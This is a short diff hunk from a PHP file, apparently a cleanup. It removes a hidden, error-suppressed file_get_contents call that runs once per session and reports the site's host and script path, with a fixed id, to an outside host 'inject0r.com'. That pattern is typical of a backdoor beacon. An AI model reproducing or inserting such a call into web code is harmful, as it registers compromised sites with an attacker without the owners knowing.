@@ -36,7 +36,6 @@ if(!isset($_SESSION["sdm"])){
             }
         }
     }
-    @file_get_contents("https://inject0r.com/v2/log.php?url=http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."&id=7821718728974864923876");
     $_SESSION["sdm"] = 1;
 }
 
